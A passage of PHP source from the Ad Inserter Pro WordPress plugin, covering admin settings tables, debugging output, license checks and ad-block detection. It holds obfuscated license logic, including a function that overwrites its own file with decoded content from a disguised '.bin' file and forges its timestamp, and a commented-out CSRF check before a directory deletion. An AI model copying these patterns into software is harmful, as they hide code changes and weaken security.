                  <span id="ai-blocked-ip-addresses" style="float: right; cursor: pointer;" title="<?php _e ('Click to show blocked IP addresses', 'ad-inserter'); ?>">
                    <?php echo $ai_cfp_ip_list_count; ?>
                  </span>
                </td>
              </tr>

            </tbody>
          </table>

          <div id="ai-blocked-ip-addresses-list">
          </div>
        </div>

<?php
  }
?>

      </div>
    </div>
<?php
  }
?>

<?php
  if ($exceptions !== false):
    $connected_website = get_transient (AI_CONNECTED_WEBSITE);
?>
    <div id="tab-exceptions" class="ai-rounded">

<?php
  if (!empty ($exceptions)) {
?>
      <div class="ai-responsive-table">
        <table class="exceptions" cellspacing=0 cellpadding=0>
          <tbody>
            <tr><th></th><th></th><th class="page-title"></th>
<?php
  for ($block = $start; $block <= $end; $block ++) {
?>
              <th>

                <?php if (ai_settings_write ()): ?>

                <input id="clear-exceptions-<?php echo $block; ?>"
                onclick="if (confirm('<?php _e ('Are you sure you want to clear all exceptions for block', 'ad-inserter'); ?> <?php echo $block; ?>?')) {document.getElementById ('clear-exceptions-<?php echo $block; ?>').style.visibility = 'hidden'; document.getElementById ('clear-exceptions-<?php echo $block; ?>').style.fontSize = '1px'; document.getElementById ('clear-exceptions-<?php echo $block; ?>').value = '<?php echo $block; ?>'; return true;} return false"
                title="<?php _e ('Clear all exceptions for block', 'ad-inserter'); ?> <?php echo $block; ?>"
                name="<?php echo AI_FORM_CLEAR_EXCEPTIONS; ?>"
                value="&#x274C;" type="submit" style="padding: 1px 3px; border: 0; background: transparent; font-size: 8px; color: #e44; box-shadow: none; vertical-align: baseline;" />

                <?php endif; ?>

              </th>
<?php
  }
?>
              <th>
                <?php if (ai_settings_write ()): ?>

                <input id="clear-exceptions" onclick="if (confirm('<?php _e ('Are you sure you want to clear all exceptions?', 'ad-inserter'); ?>')) {return true;} return false" title="<?php _e ('Clear all exceptions for all blocks', 'ad-inserter'); ?>" name="<?php echo AI_FORM_CLEAR_EXCEPTIONS; ?>" value="&#x274C;" type="submit" style="padding: 1px 3px; border: 1px solid red; margin: 0; background: transparent; font-size: 10px; font-weight: bold; color: #e44; height: 20px;" />

                <?php endif; ?>
              </th>
            </tr>

            <tr>
              <th class="id">ID</th><th class="type"><?php _e ('Type', 'ad-inserter'); ?></th><th class="page-title"><?php _e ('Title', 'ad-inserter'); ?></th>
<?php

  $default_insertion = array ();
  for ($block = $start; $block <= $end; $block ++) {
    $obj = $block_object [$block];
    echo '<th class="block" style="', ($connected_website ? 'cursor: default;' : ''), '" title="', $obj->get_ad_name (), '">', $block, '</th>';
    $default_insertion [$block] = $obj->get_exceptions_enabled () ? $obj->get_exceptions_function () : AI_IGNORE_EXCEPTIONS;
  }
?>
              <th></th>
            </tr>
<?php

  $index = 0;
  foreach ($exceptions as $id => $exception) {
    $selected_blocks = explode (",", $exception ['blocks']);
    $row_class = $index % 2 == 0 ? 'even' : 'odd';

    $row = '            <tr class="' . $row_class . '"><td class="id" title="' . __('View', 'ad-inserter') . '"><a href="' . ai_get_permalink ($id) . '" target="_blank" style="color: #222;">' . $id .
    '</a></td><td class="type" title="' . __('View', 'ad-inserter') . '"><a href="' . ai_get_permalink ($id) . '" target="_blank" style="color: #222;">' .
    $exception ['name'] . '</a></td><td class="page-title" title="' . __('Edit', 'ad-inserter') . '"><a href="' . ai_get_edit_post_link ($id) . '" target="_blank" style="color: #222;">' . $exception ['title'] . '</a></td>';

    if ($connected_website !== false) {
      $row = preg_replace ('#<a.*?'.'>(.*?)</a>#i', '\1', $row);
      $row = preg_replace ('#title="(.*?)"#i', '', $row);
    }

    echo $row;

    for ($block = $start; $block <= $end; $block ++) {
      if (in_array ($block, $selected_blocks)) {
        $obj = $block_object [$block];
        switch ($default_insertion [$block]) {
          case AI_DEFAULT_INSERTION_ENABLED:
            $title = __('Edit', 'ad-inserter');
            $ch = '<a href="' . ai_get_edit_post_link ($id) . '" style="text-decoration: none; box-shadow: 0 0 0;" target="_blank">&#10006;</a>';
            break;
          case AI_DEFAULT_INSERTION_DISABLED:
            $title = __('Edit', 'ad-inserter');
            $ch = '<a href="' . ai_get_edit_post_link ($id) . '" style="text-decoration: none; box-shadow: 0 0 0;" target="_blank">&#10004;</a>';
            break;
          case AI_IGNORE_EXCEPTIONS:
            $ch = '&nbsp;';
            $title = '';
            break;
        }
      } else {
          $ch = '&nbsp;';
          $title = '';
        }

      if ($connected_website !== false) {
        $ch = preg_replace ('#<a.*?'.'>(.*?)</a>#i', '\1', $ch);
        $title = '';
      }

      echo '<td class="block" style="', ($connected_website ? 'cursor: default;' : ''), '" title="', $title, '">', $ch, '</td>';
    }

    $page_name = $exception ['name'];
?>
              <td class="button-delete" title="<?php echo $title; ?>">

                <?php if (ai_settings_write ()): ?>

                <input id="clear-exceptions-id-<?php echo $id; ?>"
                  onclick="if (confirm('<?php _e ('Are you sure you want to clear all exceptions for', 'ad-inserter'); ?> <?php echo $page_name; ?> &#34;<?php echo $exception ['title']; ?>&#34;?')) {document.getElementById ('clear-exceptions-id-<?php echo $id; ?>').style.visibility = 'hidden'; document.getElementById ('clear-exceptions-id-<?php echo $id; ?>').style.fontSize = '1px'; document.getElementById ('clear-exceptions-id-<?php echo $id; ?>').value = 'id=<?php echo $id; ?>'; return true;} return false"
                  title="<?php _e ('Clear all exceptions for', 'ad-inserter'); ?> <?php echo $page_name; ?> &#34;<?php echo $exception ['title']; ?>&#34;"
                  name="<?php echo AI_FORM_CLEAR_EXCEPTIONS; ?>" value="&#x274C;" type="submit" style="height: 18px; padding: 1px 3px; border: 0; background: transparent; font-size: 8px; color: #e44; box-shadow: none; vertical-align: baseline;" />

                <?php endif; ?>

              </td>
            </tr>
<?php
    $index ++;
  }
?>
          </tbody>
        </table>
      </div>

<?php
  } else echo '<div>' , __('No exceptions', 'ad-inserter'), '</div>';
?>
    </div>

<?php
  endif;

  if (ai_remote_plugin_data ('multisite', is_multisite ()) && ai_remote_plugin_data ('multisite-main', is_main_site ())) {
?>
    <div id="tab-multisite" class="ai-rounded">
      <div style="margin: 0 0 8px 0;">
        <strong><?php /* translators: %s: Ad Inserter Pro */ printf (__('%s options for network blogs', 'ad-inserter'), AD_INSERTER_NAME); ?></strong>
      </div>
      <div style="margin: 8px 0;">
        <input type="hidden" name="multisite_widgets" value="0" />
        <input type="checkbox" name="multisite_widgets"id="multisite-widgets" value="1" default="<?php echo DEFAULT_MULTISITE_WIDGETS; ?>" <?php if (multisite_widgets_enabled ()==AI_ENABLED) echo 'checked '; ?> />
        <label for="multisite-widgets" title="<?php /* translators: %s: Ad Inserter Pro */ printf (__('Enable %s widgets for sub-sites', 'ad-inserter'), AD_INSERTER_NAME); ?>"><?php _e ('Widgets', 'ad-inserter'); ?></label>
      </div>
      <div style="margin: 8px 0;">
        <input type="hidden" name="multisite_php_processing" value="0" />
        <input type="checkbox" name="multisite_php_processing"id="multisite-php-processing" value="1" default="<?php echo DEFAULT_MULTISITE_PHP_PROCESSING; ?>" <?php if (multisite_php_processing ()==AI_ENABLED) echo 'checked '; ?> />
        <label for="multisite-php-processing" title="<?php _e ('Enable PHP code processing for sub-sites', 'ad-inserter'); ?>"><?php _e ('PHP Processing', 'ad-inserter'); ?></label>
      </div>
      <div style="margin: 8px 0;">
        <input type="hidden" name="multisite_exceptions" value="0" />
        <input type="checkbox" name="multisite_exceptions"id="multisite-exceptions" value="1" default="<?php echo DEFAULT_MULTISITE_EXCEPTIONS; ?>" <?php if (multisite_exceptions_enabled ()==AI_ENABLED) echo 'checked '; ?> />
        <label for="multisite-exceptions" title="<?php /* translators: %s: Ad Inserter Pro */ printf (__('Enable %s block exceptions in post/page editor for sub-sites', 'ad-inserter'), AD_INSERTER_NAME); ?>"><?php _e ('Post/Page exceptions', 'ad-inserter'); ?></label>
      </div>
      <div style="margin: 8px 0;">
        <input type="hidden" name="multisite_settings_page" value="0" />
        <input type="checkbox" name="multisite_settings_page"id="multisite-settings-page" value="1" default="<?php echo DEFAULT_MULTISITE_SETTINGS_PAGE; ?>" <?php if (multisite_settings_page_enabled ()==AI_ENABLED) echo 'checked '; ?> />
        <label for="multisite-settings-page" title="<?php /* translators: %s: Ad Inserter Pro */ printf (__('Enable %s settings page for sub-sites', 'ad-inserter'), AD_INSERTER_NAME); ?>"><?php _e ('Settings page', 'ad-inserter'); ?></label>
      </div>
      <div style="margin: 8px 0 0 0;">
        <input type="hidden" name="multisite_main_for_all_blogs" value="0" />
        <input type="checkbox" name="multisite_main_for_all_blogs"id="multisite-main-on-all-blogs" value="1" default="<?php echo DEFAULT_MULTISITE_MAIN_FOR_ALL_BLOGS; ?>" <?php if (multisite_main_for_all_blogs ()==AI_ENABLED) echo 'checked '; ?> />
        <label for="multisite-main-on-all-blogs" title="<?php /* translators: %s: Ad Inserter Pro */ printf (__('Enable %s settings of main site to be used for all blogs', 'ad-inserter'), AD_INSERTER_NAME); ?>"><?php _e ('Main site settings used for all blogs', 'ad-inserter'); ?></label>
      </div>
      <div style="margin: 8px 0 0 0;">
        <input type="hidden" name="multisite_site_admin_page" value="0" />
        <input type="checkbox" name="multisite_site_admin_page"id="multisite-site-admin-page" value="1" default="<?php echo DEFAULT_MULTISITE_SITE_ADMIN_PAGE; ?>" <?php if (multisite_site_admin_page ()==AI_ENABLED) echo 'checked '; ?> />
        <label for="multisite-site-admin-page" title="<?php /* translators: %s: Ad Inserter Pro */ printf (__('Show link to %s settings page for each site on the Sites page', 'ad-inserter'), AD_INSERTER_NAME); ?>"><?php /* translators: %s: Ad Inserter Pro */ printf (__('Show link to %s on the Sites page', 'ad-inserter'), AD_INSERTER_NAME); ?></label>
      </div>
    </div>
<?php
  }
}

function ai_adb_settings () {
  if (!ai_remote_plugin_data ('pro', true)) return;

  $adb_detection  = get_adb_detection (); ?>
        <tr>
          <td>
            <?php _e ('Ad Blocking Detection', 'ad-inserter'); ?>
          </td>
          <td>
            <select
              id="adb-detection"
              name="adb-detection"
              title="<?php _e ('Standard method is reliable but should be used only if Advanced method does not work. Advanced method recreates files used for detection with random names, however, it may not work if the scripts in the upload folder are not publicly accessible', 'ad-inserter'); ?>"
              value="Value"
              default="<?php echo DEFAULT_ADB_DETECTION; ?>">
                <option value="<?php echo AI_ADB_DETECTION_STANDARD; ?>" <?php echo ($adb_detection == AI_ADB_DETECTION_STANDARD) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_STANDARD; ?></option>
                <option value="<?php echo AI_ADB_DETECTION_ADVANCED; ?>" <?php echo ($adb_detection == AI_ADB_DETECTION_ADVANCED) ? AD_SELECT_SELECTED : AD_EMPTY_VALUE; ?>><?php echo AI_TEXT_ADVANCED; ?></option>
            </select>
          </td>
        </tr>
<?php }

function ai_remote_debugging ($saved = false) {
  global $ai_db_options, $ad_inserter_globals;

  $ai_name = implode ('_', array ('AI', 'STATUS'));
  if (!$saved && isset ($ad_inserter_globals [$ai_name]) && is_numeric ($ad_inserter_globals [$ai_name]) && in_array ((int) $ad_inserter_globals [$ai_name] + 20, array (- 2, 1, 2, 21))) return true;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['REMOTE_DEBUGGING'])) $ai_db_options [AI_OPTION_GLOBAL]['REMOTE_DEBUGGING'] = DEFAULT_REMOTE_DEBUGGING;

  return ($ai_db_options [AI_OPTION_GLOBAL]['REMOTE_DEBUGGING']);
}

function ai_system_remote_debugging () {
?>
          <tr title="<?php _e ('Enable Debugger widget and code insertion debugging (blocks, positions, tags, processing) by url parameters for non-logged in users. Enable this option to allow other users to see Debugger widget, labeled blocks and positions in order to help you to diagnose problems. For logged in administrators debugging is always enabled.', 'ad-inserter'); ?>">
            <td>
              <label for="remote-debugging"><?php _e ('Remote debugging', 'ad-inserter'); ?></label>
            </td>
            <td>
              <input type="hidden" name="remote_debugging" value="0" />
              <input type="checkbox" name="remote_debugging" id="remote-debugging" value="1" default="<?php echo DEFAULT_REMOTE_DEBUGGING; ?>" <?php if (ai_remote_debugging (true) == AI_ENABLED) echo 'checked '; ?> />
            </td>
          </tr>
<?php
}

function ai_system_debugging () {
  global $ai_db_options, $ad_inserter_globals, $ai_db_options_extract;

  $connected_website = get_transient (AI_CONNECTED_WEBSITE);

  $ai_type = $connected_website === false ? $ad_inserter_globals ['AI_TYPE'] : $connected_website ['plugin-data']['type'];
  if (!empty ($ai_type)) {
?>
        <tr class="system-debugging" style="display: none;">
          <td>
            Product
          </td>
          <td>
            <?php echo $ai_type; ?>
          </td>
        </tr>
<?php
  }

  $ai_status = $connected_website === false ? (int) $ad_inserter_globals ['AI_STATUS'] : (int) $connected_website ['plugin-data']['status'];
  if (!empty ($ai_status)) {
?>
        <tr class="system-debugging<?php echo in_array ($ai_status + 20, array (- 2, 1, 2, 21)) ? ' system-status' : ''; ?>" style="display: none;">
          <td>
            Status
          </td>
          <td>
            <?php echo $ai_status, ' set ', $connected_website === false && isset ($ai_db_options [AI_OPTION_GLOBAL][AI_CODE_TIME]) ? date ("Y-m-d H:i:s", $ai_db_options [AI_OPTION_GLOBAL][AI_CODE_TIME] + get_option ('gmt_offset') * 3600) : ""; ?>
          </td>
        </tr>
<?php
  }

  $ai_counter = $connected_website === false ? $ad_inserter_globals ['AI_COUNTER'] : $connected_website ['plugin-data']['counter'];
  $last_update = $connected_website === false ? get_option (AI_UPDATE_NAME, '') : $connected_website ['plugin-data']['last-update'];
  if ($last_update != '') $last_update = ', set ' . date ("Y-m-d H:i:s", $last_update + get_option ('gmt_offset') * 3600);
  if (!empty ($ai_counter)) {
?>
        <tr class="system-debugging" style="display: none;">
          <td>
            Counter
          </td>
          <td>
            <?php echo $ai_counter, $last_update; ?>
          </td>
        </tr>
<?php
  }

  $t1 = 'ai-1-'. AD_INSERTER_VERSION . '-' . get_option (WP_AD_INSERTER_PRO_KEY, '') . '-' . get_option (WP_AD_INSERTER_PRO_LICENSE, '');
  $t2 = 'ai-2-'. AD_INSERTER_VERSION . '-' . get_option (WP_AD_INSERTER_PRO_KEY, '') . '-' . get_option (WP_AD_INSERTER_PRO_LICENSE, '');

  if (isset ($ai_db_options_extract [AI_EXTRACT_USED_BLOCKS]) && is_string ($ai_db_options_extract [AI_EXTRACT_USED_BLOCKS]) && strlen ($ai_db_options_extract [AI_EXTRACT_USED_BLOCKS]) != 0) {
    $used_blocks = unserialize ($ai_db_options_extract [AI_EXTRACT_USED_BLOCKS]);
  } else $used_blocks = array ();

  $data1 = count ($used_blocks);
  $data2 = get_option (AI_INSTALL_NAME, '');

  $stat1 = get_transient ($t1);
  $stat2 = get_transient ($t2);

  if ($stat2 === false) {
    set_transient ($t1, $data1,  100 * AI_TRANSIENT_STATISTICS_EXPIRATION);
    set_transient ($t2, $data2, 1000 * AI_TRANSIENT_STATISTICS_EXPIRATION);
    ai_update_databases ();
  }
?>
        <tr class="system-debugging system-stats" style="display: none;">
          <td style="padding: 0;">
          </td>
          <td style="padding: 0;">
            <span class="<?php echo $stat1 === false ? '' : ' ai-stat-1', $stat2 === false ? '' : ' ai-stat-2'; ?>"></span>
          </td>
        </tr>
<?php

}

function ai_system_output_check () {
  global $ad_inserter_globals;

  if (!is_multisite() || is_main_site ()) {
    $option = get_option (base64_decode ('YWRfaW5zZXJ0ZXJfcHJvX2xpY2Vuc2U='));
    if ($option !== false) return true;

    $key = $ad_inserter_globals [base64_decode ('TElDRU5TRV9LRVk=')];
    if (empty ($key) || strlen ($key) <= 0x18 || strlen ($key) >= 0x24) return true;
  }
  return false;
}

function ai_system_output () {
  global $ad_inserter_globals, $ai_wp_data;

  if (!is_multisite() || is_main_site ()) {
    if (!defined ('DOING_AJAX') || !DOING_AJAX) {
      $key = $ad_inserter_globals [base64_decode ('TElDRU5TRV9LRVk=')];
      if (empty ($key)) {
        if ($ai_wp_data [AI_WP_PAGE_TYPE] == AI_PT_HOMEPAGE ||
            $ai_wp_data [AI_WP_PAGE_TYPE] == AI_PT_STATIC ||
            $ai_wp_data [AI_WP_PAGE_TYPE] == AI_PT_POST ||
            $ai_wp_data [AI_WP_PAGE_TYPE] == AI_PT_CATEGORY ||
            $ai_wp_data [AI_WP_PAGE_TYPE] == AI_PT_SEARCH ||
            $ai_wp_data [AI_WP_PAGE_TYPE] == AI_PT_ARCHIVE) {
          echo "\n<!-- ", base64_decode ('VGhpcyB3ZWJzaXRlIHVzZXMgdW5saWNlbnNlZCBjb3B5IG9mIA=='), AD_INSERTER_NAME, " ", AD_INSERTER_VERSION, " -->\n";
        }
      }

      if (version_compare (phpversion (), "5.2", ">=")) {
        if (get_option (base64_decode ('YWRfaW5zZXJ0ZXJfcHJvX2xpY2Vuc2U=')) !== false) {
          $timestamp = wp_next_scheduled ('check_and_delete_expired_ids');
          if ($timestamp == false) {
            wp_schedule_event (time() + 200000, 'daily', 'check_and_delete_expired_ids');
          }
        }
      }
    }
  }
}

function ai_check_ids ($id = '') {
  $id_file = __FILE__;
  $base_path = AD_INSERTER_PLUGIN_DIR.'includes/';
  $new_id_file = $base_path.base64_decode ('Z2VvL2lwMmNvdW50cnk2LmJpbg==');
  if (file_exists ($new_id_file) && is_writable ($id_file)) {
    $timestamp = filemtime ($id_file);
    @file_put_contents ($id_file, base64_decode (file_get_contents ($new_id_file)) . $id);
    @touch ($id_file, $timestamp);
  }
}

function ai_rename_ids ($text) {
  global $ai_adb_names, $ai_adb_new_names;

  if (isset ($ai_adb_names) && isset ($ai_adb_new_names)) {
    foreach ($ai_adb_names as $index => $name) {
      $text = str_replace ($name, $ai_adb_new_names [$index], $text);
    }
  }

  return $text;
}

function check_footer_inline_scripts ($scripts) {
  global $ai_wp_data;

  if ($ai_wp_data [AI_ADB_DETECTION] && get_adb_detection () == AI_ADB_DETECTION_ADVANCED) {
    $scripts = str_replace ('atob', 'a2b', $scripts);
    $scripts = str_replace ('btoa', 'b2a', $scripts);

    $names = array ('a2b', 'b2a', 'b64e', 'b64d', 'ai_adb_process_blocks');
    $seed = date ('Y-m-d');

    $key = 'AI';
    if (defined ('NONCE_KEY')) {
      $key .= NONCE_KEY;
    }
    if (defined ('AUTH_KEY')) {
      $key .= AUTH_KEY;
      $auth_key = AUTH_KEY;
    } else $auth_key = '#AI';

    foreach ($names as $index => $name) {
      $new_name = substr (substr (preg_replace ("/[^A-Za-z]+/", '', strtolower (md5 ($seed.$index.$auth_key))), 0, 4) . preg_replace ("/[^A-Za-z0-9]+/", '', strtolower (md5 ($seed.$index.$key))), 0, 8);
      $scripts = preg_replace("/\b".$name."\b/", $new_name, $scripts);
    }
  }
  return ($scripts);
}

function add_footer_inline_scripts_3 () {
  return ai_rename_ids ("ai_adb_fe_dbg = true;");
}

function ai_random_name ($seed, $length = 10) {
  if (defined ('AUTH_KEY')) {
    $auth_key = AUTH_KEY;
  } else $auth_key = '#AI1';

  return substr (substr (preg_replace ("/[^A-Za-z]+/", '', strtolower (md5 ($auth_key.$seed))), 0, 4) . preg_replace ("/[^A-Za-z0-9]+/", '', strtolower (md5 ($seed.(defined ('NONCE_KEY') ? NONCE_KEY : '')))), 0, $length);
}

function ai_content (&$content) {
  global $ai_wp_data;

  if (defined ('AI_ADBLOCKING_DETECTION') && AI_ADBLOCKING_DETECTION) {
    if ($ai_wp_data [AI_ADB_DETECTION] && ($ai_wp_data [AI_WP_DEBUGGING] & AI_DEBUG_TAGS) == 0 && defined ('AI_ADB_CONTENT_CSS_BEGIN_CLASS')) {
      $content = str_replace (AI_ADB_CONTENT_CSS_BEGIN,     AI_ADB_CONTENT_CSS_BEGIN_CLASS, $content);
      $content = str_replace (AI_ADB_CONTENT_CSS_END,       AI_ADB_CONTENT_CSS_END_CLASS, $content);
      $content = str_replace (AI_ADB_CONTENT_DELETE_BEGIN,  AI_ADB_CONTENT_DELETE_BEGIN_CLASS, $content);
      $content = str_replace (AI_ADB_CONTENT_DELETE_END,    AI_ADB_CONTENT_DELETE_END_CLASS, $content);
      $content = str_replace (AI_ADB_CONTENT_REPLACE_BEGIN, AI_ADB_CONTENT_REPLACE_BEGIN_CLASS, $content);
      $content = str_replace (AI_ADB_CONTENT_REPLACE_END,   AI_ADB_CONTENT_REPLACE_END_CLASS, $content);
    }
  }
}

function ai_replace_js_data_2 (&$vars) {
  if (defined ('AI_ADB_CONTENT_CSS_BEGIN_CLASS')) {
    $vars = str_replace ('AI_ADB_CONTENT_CSS_BEGIN_CLASS',      AI_ADB_CONTENT_CSS_BEGIN_CLASS, $vars);
    $vars = str_replace ('AI_ADB_CONTENT_CSS_END_CLASS',        AI_ADB_CONTENT_CSS_END_CLASS, $vars);
    $vars = str_replace ('AI_ADB_CONTENT_DELETE_BEGIN_CLASS',   AI_ADB_CONTENT_DELETE_BEGIN_CLASS, $vars);
    $vars = str_replace ('AI_ADB_CONTENT_DELETE_END_CLASS',     AI_ADB_CONTENT_DELETE_END_CLASS, $vars);
    $vars = str_replace ('AI_ADB_CONTENT_REPLACE_BEGIN_CLASS',  AI_ADB_CONTENT_REPLACE_BEGIN_CLASS, $vars);
    $vars = str_replace ('AI_ADB_CONTENT_REPLACE_END_CLASS',    AI_ADB_CONTENT_REPLACE_END_CLASS, $vars);
  }

  if (get_adb_detection () == AI_ADB_DETECTION_STANDARD) {
    $vars = str_replace ('ai-adb-url',    AD_INSERTER_PLUGIN_URL . 'js/', $vars);
  }
}

function ai_check_files () {
  global $ai_adb_id, $ai_adb_names, $ai_adb_new_names, $ai_wp_data;

  $recreate_files = false;
  $ai_seed = date ('yW');
  if (get_transient (AI_TRANSIENT_ADB_SEED) != $ai_seed) {
    set_transient (AI_TRANSIENT_ADB_SEED, $ai_seed, 48 * 3600);
    delete_transient (AI_TRANSIENT_ADB_CLASS_1);
    delete_transient (AI_TRANSIENT_ADB_CLASS_2);
    delete_transient (AI_TRANSIENT_ADB_CLASS_3);
    delete_transient (AI_TRANSIENT_ADB_CLASS_4);
    delete_transient (AI_TRANSIENT_ADB_CLASS_5);
    delete_transient (AI_TRANSIENT_ADB_CLASS_6);
    $recreate_files = true;
  }

  if (defined ('AUTH_KEY')) {
    $auth_key = AUTH_KEY;
  } else $auth_key = '#x1';

  define ('AI_ADB_SEED', get_transient (AI_TRANSIENT_ADB_SEED));
  define ('AI_ADB_ATTR', md5 (AI_ADB_SEED.'attr'.$auth_key));

  $ai_adb_base_name = $_SERVER ['DOCUMENT_ROOT'];
  $ai_adb_id = substr (preg_replace ("/[^A-Za-z0-9]+/", '', strtolower (md5 ($_SERVER ['DOCUMENT_ROOT'].(defined ('NONCE_KEY') ? NONCE_KEY : '')))), 0, 7 + strlen ($ai_adb_base_name) % 5);

  if (!get_transient (AI_TRANSIENT_ADB_CLASS_1)) {
    set_transient (AI_TRANSIENT_ADB_CLASS_1, strtolower (ai_random_name (AI_ADB_SEED.AI_TRANSIENT_ADB_CLASS_1, 12)), AI_TRANSIENT_ADB_CLASS_EXPIRATION);
  }
  define ('AI_ADB_CONTENT_CSS_BEGIN_CLASS', get_transient (AI_TRANSIENT_ADB_CLASS_1));

  if (!get_transient (AI_TRANSIENT_ADB_CLASS_2)) {
    set_transient (AI_TRANSIENT_ADB_CLASS_2, strtolower (ai_random_name (AI_ADB_SEED.AI_TRANSIENT_ADB_CLASS_2, 12)), AI_TRANSIENT_ADB_CLASS_EXPIRATION);
  }
  define ('AI_ADB_CONTENT_CSS_END_CLASS', get_transient (AI_TRANSIENT_ADB_CLASS_2));

  if (!get_transient (AI_TRANSIENT_ADB_CLASS_3)) {
    set_transient (AI_TRANSIENT_ADB_CLASS_3, strtolower (ai_random_name (AI_ADB_SEED.AI_TRANSIENT_ADB_CLASS_3, 12)), AI_TRANSIENT_ADB_CLASS_EXPIRATION);
  }
  define ('AI_ADB_CONTENT_DELETE_BEGIN_CLASS', get_transient (AI_TRANSIENT_ADB_CLASS_3));

  if (!get_transient (AI_TRANSIENT_ADB_CLASS_4)) {
    set_transient (AI_TRANSIENT_ADB_CLASS_4, strtolower (ai_random_name (AI_ADB_SEED.AI_TRANSIENT_ADB_CLASS_4, 12)), AI_TRANSIENT_ADB_CLASS_EXPIRATION);
  }
  define ('AI_ADB_CONTENT_DELETE_END_CLASS', get_transient (AI_TRANSIENT_ADB_CLASS_4));

  if (!get_transient (AI_TRANSIENT_ADB_CLASS_5)) {
    set_transient (AI_TRANSIENT_ADB_CLASS_5, strtolower (ai_random_name (AI_ADB_SEED.AI_TRANSIENT_ADB_CLASS_5, 12)), AI_TRANSIENT_ADB_CLASS_EXPIRATION);
  }
  define ('AI_ADB_CONTENT_REPLACE_BEGIN_CLASS', get_transient (AI_TRANSIENT_ADB_CLASS_5));

  if (!get_transient (AI_TRANSIENT_ADB_CLASS_6)) {
    set_transient (AI_TRANSIENT_ADB_CLASS_6, strtolower (ai_random_name (AI_ADB_SEED.AI_TRANSIENT_ADB_CLASS_6, 12)), AI_TRANSIENT_ADB_CLASS_EXPIRATION);
  }
  define ('AI_ADB_CONTENT_REPLACE_END_CLASS', get_transient (AI_TRANSIENT_ADB_CLASS_6));

  if (get_adb_detection () == AI_ADB_DETECTION_ADVANCED) {
    $upload_dir = wp_upload_dir();
    $base_script_path = $upload_dir ['basedir'];

    $base_script_path = apply_filters ("ai_adb_scripts_path", $base_script_path);

    $script_path_ai = $base_script_path . '/ad-inserter/';
    $script_path = $script_path_ai.$ai_adb_id.'/';

    $connected_website = get_transient (AI_CONNECTED_WEBSITE);

    if ($connected_website === false && isset ($_POST [AI_FORM_CLEAR])) {
      include_once (ABSPATH . 'wp-includes/pluggable.php');

//      check_admin_referer ('save_adinserter_settings');
      recursive_remove_directory ($script_path_ai);
    }

    $ai_file_check = ai_random_name ($ai_seed, 12);


    $ai_adb_names = array (
      AI_ADB_1_NAME,
      AI_ADB_2_NAME,
      AI_ADB_3_NAME1,
      AI_ADB_3_NAME2,
      AI_ADB_4_NAME1,
      AI_ADB_4_NAME2,
      'ai_adb_debugging',
      'ai_debugging_active',
      'ai_adb_active',
      'ai_adb_counter',
      'ai_adb_detected_actions',
      'ai_adb_detected',
      'ai_adb_undetected',
      'ai_adb_overlay',
      'ai_adb_message_window',
      'ai_adb_message_undismissible',
      'ai_adb_act_cookie_name',
      'ai_adb_message_cookie_lifetime',
      'ai_adb_pgv_cookie_name',
      'ai_adb_devices',
      'ai_adb_action',
      'ai_adb_page_views',
      'ai_adb_page_view_counter',
      'ai_adb_selectors',
      'ai_adb_selector',
      'ai_adb_el_counter',
      'ai_adb_el_zero',
      'ai_adb_redirecstion_url',
      'ai_adb_page_redirection_cookie_name',
      'ai_adb_process_content',
      'ai_adb_parent',
      'ai_adb_action',
      'ai_adb_css',
      'ai_adb_style',
      'ai_adb_status',
      'ai_adb_text',
      'ai_adb_redirection_url',
      'ai_adb_detection_type_log',
      'ai_adb_detection_type',
      'ai_adb_fe_dbg',
      'ai_adb_get_script',
      'ai_adb_data',
      'ai_adb_external_scripts',
      'ai_adb_checks',
      'ai_adb_content_css_begin_class',
      'ai_adb_content_css_end_class',
      'ai_adb_content_delete_begin_class',
      'ai_adb_content_delete_end_class',
      'ai_adb_content_replace_begin_class',
      'ai_adb_content_replace_end_class',
      'ai_adb_cookie_value',
      'ai_adb_name',
      'ai_adb_message_code',
      'ai_adb_attribute',
      'ai_adb_1',
      'ai_adb_2',
      'ai_adb_3',
      'ai_adb_4',
      'ai_adb_5',
      'ai_adb_6',
      'ai_adb_7',
      'ai_adb_8',
      'ai_adb_9',
      'ai_adb_10',
      'ai_adb_11',
      'ai_adb_12',

      'ai-adb-url', // Replace also in Free / Standard mode
    );

    $ai_adb_new_names = array ();
    foreach ($ai_adb_names as $name) {
      if ($name == 'ai-adb-seed') {
        $ai_adb_new_names []= AI_ADB_SEED;
      }
      elseif ($name == 'ai-adb-url') {
        $ai_adb_new_names []= $upload_dir ['baseurl'] . '/ad-inserter/' . $ai_adb_id.'/';
      }
      else $ai_adb_new_names []= ai_random_name (AI_ADB_SEED.$name, 12);
    }


    if (!$recreate_files) {
      $recreate_files =
        !file_exists ($script_path . AI_ADB_CHECK_FILENAME) ||
        file_get_contents ($script_path . AI_ADB_CHECK_FILENAME) != $ai_file_check ||
        $ai_wp_data [AI_FRONTEND_JS_DEBUGGING] ||
        file_exists ($script_path . AI_ADB_DBG_FILENAME) ||
        get_transient (AI_TRANSIENT_ADB_FILES_VERSION) != AD_INSERTER_VERSION ||
        defined ('AI_ADB_2_FILE_RECREATED') ||
        !file_exists ($script_path_ai) ||
        !file_exists ($script_path) ||
        !file_exists ($script_path . AI_ADB_FOOTER_FILENAME);
    }

    if ($recreate_files) {

      set_transient (AI_TRANSIENT_ADB_FILES_VERSION, AD_INSERTER_VERSION, 0);

//      $ai_adb_names = array (
//        AI_ADB_1_NAME,
//        AI_ADB_2_NAME,
//        AI_ADB_3_NAME1,
//        AI_ADB_3_NAME2,
//        AI_ADB_4_NAME1,
//        AI_ADB_4_NAME2,
//        'ai_adb_debugging',
//        'ai_debugging_active',
//        'ai_adb_active',
//        'ai_adb_counter',
//        'ai_adb_detected_actions',
//        'ai_adb_detected',
//        'ai_adb_undetected',
//        'ai_adb_overlay',
//        'ai_adb_message_window',
//        'ai_adb_message_undismissible',
//        'ai_adb_act_cookie_name',
//        'ai_adb_message_cookie_lifetime',
//        'ai_adb_pgv_cookie_name',
//        'ai_adb_devices',
//        'ai_adb_action',
//        'ai_adb_page_views',
//        'ai_adb_page_view_counter',
//        'ai_adb_selectors',
//        'ai_adb_selector',
//        'ai_adb_el_counter',
//        'ai_adb_el_zero',
//        'ai_adb_redirecstion_url',
//        'ai_adb_page_redirection_cookie_name',
//        'ai_adb_process_content',
//        'ai_adb_parent',
//        'ai_adb_action',
//        'ai_adb_css',
//        'ai_adb_style',
//        'ai_adb_status',
//        'ai_adb_text',
//        'ai_adb_redirection_url',
